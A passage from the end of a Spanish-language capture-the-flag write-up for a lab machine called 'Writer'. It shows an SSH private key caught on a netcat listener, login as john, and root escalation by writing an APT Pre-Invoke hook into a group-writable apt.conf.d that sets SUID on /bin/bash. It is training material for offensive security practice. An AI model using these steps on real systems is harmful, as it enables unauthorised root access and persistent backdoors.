</code></pre></div><p>Y obtenemos la clave privada de <code>john</code>. Con esto conseguimos acceso por ssh:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">nc</span> -nlvp 4444 &gt; id_rsa
Ncat: Version 7.93 ( https://nmap.org/ncat )  
Ncat: Listening on :::4444
Ncat: Listening on 0.0.0.0:4444
Ncat: Connection from 10.10.11.101.
Ncat: Connection from 10.10.11.101:38630.
^C

<span class="code-cyan">$</span> <span class="code-dark-green">chmod</span> 600 <span class="mtku">id_rsa</span>

<span class="code-cyan">$</span> <span class="code-dark-green">ssh</span> -i <span class="mtku">id_rsa</span> john@10.10.11.101
<span class="code-green">john@writer</span>:<span class="code-blue">~</span>$
</code></pre></div><h2 id="escalada-de-privilegios">Escalada de privilegios</h2><p>Si listamos procesos con <code>ps</code>, vemos que existe una tarea Cron ejecutada como <code>root</code> que realiza un <code>apt-get update</code>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-green">john@writer</span>:<span class="code-blue">~</span>$ ps -faux | grep root
...
<span class="code-red">root</span>       31467  0.0  0.0   8356  3400 ?        S    19:52   0:00  _ /usr/sbin/CRON -f
<span class="code-red">root</span>       31475  0.0  0.0   2608   608 ?        Ss   19:52   0:00      _ /bin/sh -c /usr/bin/apt-get update  
<span class="code-red">root</span>       31479  0.1  0.2  16204  8524 ?        S    19:52   0:00          _ /usr/bin/apt-get update
...
</code></pre></div><p>De nuevo, podemos ver si pertenecemos a algún grupo, y vemos que somos parte del grupo <code>management</code>, cuyos miembros pueden escribir en <code>/etc/apt/apt.conf.d</code>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-green">john@writer</span>:<span class="code-blue">~</span>$ id
uid=1001(john) gid=1001(john) groups=1001(john),1003(management)
<span class="code-green">john@writer</span>:<span class="code-blue">~</span>$ find / -group management 2&gt;/dev/null
/etc/apt/apt.conf.d
<span class="code-green">john@writer</span>:<span class="code-blue">~</span>$ cat /etc/apt/apt.conf.d/* | grep APT::
<span class="code-red">APT::</span>Periodic::Update-Package-Lists "1";
<span class="code-red">APT::</span>Periodic::Download-Upgradeable-Packages "0";
<span class="code-red">APT::</span>Periodic::AutocleanInterval "0";
<span class="code-red">APT::</span>Update::Post-Invoke-Success {"touch /var/lib/apt/periodic/update-success-stamp 2&gt;/dev/null || true";};
<span class="code-red">APT::</span>Archives::MaxAge "30";
<span class="code-red">APT::</span>Archives::MinAge "2";
<span class="code-red">APT::</span>Archives::MaxSize "500";
<span class="code-red">APT::</span>Update::Post-Invoke-Success {
<span class="code-red">APT::</span>Update::Post-Invoke-Success {
<span class="code-red">APT::</span>Update::Post-Invoke-Success {"/usr/lib/update-notifier/update-motd-updates-available 2&gt;/dev/null || true";};  
</code></pre></div><p>Después de ver los archivos que hay en el directorio y buscando <code>apt-get</code> en <a href="https://gtfobins.github.io/gtfobins/apt-get/">GTFOBins</a>, podemos poner un comando para que se ejecute antes de <code>apt-get update</code>. Por ejemplo, podemos darle permisos SUID a <code>/bin/bash</code>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-green">john@writer</span>:<span class="code-blue">~</span>$ ls -l /bin/bash
-rwxr-xr-x 1 root root 1183448 Jun 18  2020 <span class="code-green">/bin/bash</span>
<span class="code-green">john@writer</span>:<span class="code-blue">~</span>$ echo 'APT::Update::Pre-Invoke {"chmod 4755 /bin/bash";};' &gt; /etc/apt/apt.conf.d/01asdf  
</code></pre></div><p>Y después de un minuto aproximadamente tenemos acceso como <code>root</code>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-green">john@writer</span>:<span class="code-blue">~</span>$ ls -l /bin/bash
-rwsr-xr-x 1 root root 1183448 Jun 18  2020 <span class="code-white code-bg-red">/bin/bash</span>  
<span class="code-green">john@writer</span>:<span class="code-blue">~</span>$ bash -p
bash-5.0# cat /root/root.txt
f7e5f21393414b3bb227ee32fdae67a
</code></pre></div><div class="mt6 instapaper_ignoref"></div></div><aside aria-label="aside" class="w-20-l mt6-l aside-desktop"><div class="bg-card pa3 nested-list-reset nested-copy-line-height nested-links" style="position:sticky;top:5rem;padding-bottom:0"><p class="f5 b pb2" style="border-bottom:5px solid var(--background);margin:0">Contenidos</p><nav id="TableOfContents"><ul><li><a href="#escaneo-de-puertos">Escaneo de puertos</a></li><li><a href="#enumeración">Enumeración</a></li><li><a href="#encontrando-una-inyección-de-código-sql">Encontrando una inyección de código SQL</a><ul><li><a href="#leyendo-archivos-mediante-sqli">Leyendo archivos mediante SQLi</a></li></ul></li><li><a href="#análisis-del-código-python">Análisis del código Python</a><ul><li><a href="#enumeración-por-smb">Enumeración por SMB</a></li></ul></li><li><a href="#acceso-en-la-máquina">Acceso en la máquina</a></li><li><a href="#enumeración-del-sistema">Enumeración del sistema</a></li><li><a href="#movimiento-lateral-al-usuario-john">Movimiento lateral al usuario <code>john</code></a></li><li><a href="#escalada-de-privilegios">Escalada de privilegios</a></li></ul></nav><div class="bg-card" style="border-top:5px solid var(--background)"><a class="bmc-btn w-100" target="_blank" href="http://buymeacoffee.com/7Rocky" style="padding:0" title="Buy me a beer">🍺 <span class="bmc-btn-text" style="font-family:Cookie!important;color:#fff">Buy me a beer</span></a></div></div></aside></article></main><footer class="bottom-0 w-100" role="contentinfo"><div class="tc mw8 ph3" style="margin:auto"><form style="background-color:var(--background-card)" class="tc mw8 pv3 mb3" action="https://tinyletter.com/7Rocky" method="post" target="popupwindow" onsubmit='return window.open("https://tinyletter.com/7Rocky","popupwindow","scrollbars=yes,width=800,height=600"),!0'><h3 class="tc">Recibe un resumen semanal del blog</h3><p class="tc"><label for="tlemail"></label></p><p class="tc"><input type="text" class="w-80 f5 pv3 ph3 bg-light-gray bn search" placeholder="Introduce tu correo electrónico" name="email" id="tlemail"></p><input type="hidden" value="1" name="embed">
<input style="display:none;color:var(--header)" type="submit" value="Suscribirse"><p class="tc">impulsado por <a href="https://tinyletter.com" target="_blank" title="tiniletter">TinyLetter</a></p></form></div><div class="bg-black w-100 pa3" role="contentinfo"><div class="flex justify-between"><a class="f4 fw4 hover-white no-underline white-70 dn dib-ns pv2 ph3" href="https://7rocky.github.io/" title="https://7rocky.github.io/">&copy; Blog de 7Rocky. Ciberseguridad y Mates 2023</a><div style="margin-top:8px"><div><div><a href="https://www.linkedin.com/in/roberto-gesteira-minarro/" target="_blank" class="link-transition linkedin link dib z-999 pt3 pt0-l mr1" title="LinkedIn link" rel="noopener" aria-label="follow on LinkedIn——Opens in a new window"><svg height="30" style="enable-background:new 0 0 65 65" viewBox="0 0 65 65" width="30" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M50.837 48.137V36.425c0-6.275-3.35-9.195-7.816-9.195-3.604.0-5.219 1.983-6.119 3.374V27.71h-6.79c.09 1.917.0 20.427.0 20.427h6.79V36.729c0-.609.044-1.219.224-1.655.49-1.22 1.607-2.483 3.482-2.483 2.458.0 3.44 1.873 3.44 4.618v10.929H50.837zM22.959 24.922c2.367.0 3.842-1.57 3.842-3.531-.044-2.003-1.475-3.528-3.797-3.528s-3.841 1.524-3.841 3.528c0 1.961 1.474 3.531 3.753 3.531H22.959zM34 64C17.432 64 4 50.568 4 34 4 17.431 17.432 4 34 4s30 13.431 30 30c0 16.568-13.432 30-30 30zM26.354 48.137V27.71h-6.789v20.427h6.789z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg><span class="new-window"><svg height="8" style="enable-background:new 0 0 1000 1000" viewBox="0 0 1e3 1e3" width="8" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M598 128h298v298h-86V274L392 692l-60-60 418-418H598v-86zM810 810V512h86v298c0 46-40 86-86 86H214c-48 0-86-40-86-86V214c0-46 38-86 86-86h298v86H214v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></span></a><a href="https://github.com/7Rocky" target="_blank" class="link-transition github link dib z-999 pt3 pt0-l mr1" title="GitHub link" rel="noopener" aria-label="follow on GitHub——Opens in a new window"><svg height="30" style="enable-background:new 0 0 512 512" viewBox="0 0 512 512" width="30" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M256 32C132.3 32 32 134.8 32 261.7c0 101.5 64.2 187.5 153.2 217.9 11.2 2.1 15.3-5 15.3-11.1.0-5.5-.2-19.9-.3-39.1-62.3 13.9-75.5-30.8-75.5-30.8-10.2-26.5-24.9-33.6-24.9-33.6-20.3-14.3 1.5-14 1.5-14 22.5 1.6 34.3 23.7 34.3 23.7 20 35.1 52.4 25 65.2 19.1 2-14.8 7.8-25 14.2-30.7-49.7-5.8-102-25.5-102-113.5.0-25.1 8.7-45.6 23-61.6-2.3-5.8-10-29.2 2.2-60.8.0.0 18.8-6.2 61.6 23.5 17.9-5.1 37-7.6 56.1-7.7 19 .1 38.2 2.6 56.1 7.7 42.8-29.7 61.5-23.5 61.5-23.5 12.2 31.6 4.5 55 2.2 60.8 14.3 16.1 23 36.6 23 61.6.0 88.2-52.4 107.6-102.3 113.3 8 7.1 15.2 21.1 15.2 42.5.0 30.7-.3 55.5-.3 63 0 6.1 4 13.3 15.4 11C415.9 449.1 480 363.1 480 261.7 480 134.8 379.7 32 256 32z"/></svg><span class="new-window"><svg height="8" style="enable-background:new 0 0 1000 1000" viewBox="0 0 1e3 1e3" width="8" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M598 128h298v298h-86V274L392 692l-60-60 418-418H598v-86zM810 810V512h86v298c0 46-40 86-86 86H214c-48 0-86-40-86-86V214c0-46 38-86 86-86h298v86H214v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></span></a></div></div></div></div></div></footer></body></html>